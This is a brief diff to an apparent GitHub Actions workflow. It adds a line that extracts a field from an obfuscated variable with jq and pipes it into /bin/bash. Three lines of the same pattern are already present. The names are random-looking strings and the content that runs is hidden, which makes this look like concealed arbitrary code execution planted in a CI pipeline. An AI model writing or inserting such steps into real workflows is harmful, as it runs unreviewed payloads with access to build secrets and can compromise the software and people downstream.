@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$bm7642" | jq -r .ty59225 | /bin/bash
           echo $b2 | jq -r .aoqx33 | /bin/bash
           echo $ewcn12 | jq -r .cknh9328 | /bin/bash
+          printf '%s' "$gzkg21867" | jq -r .ciu5 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
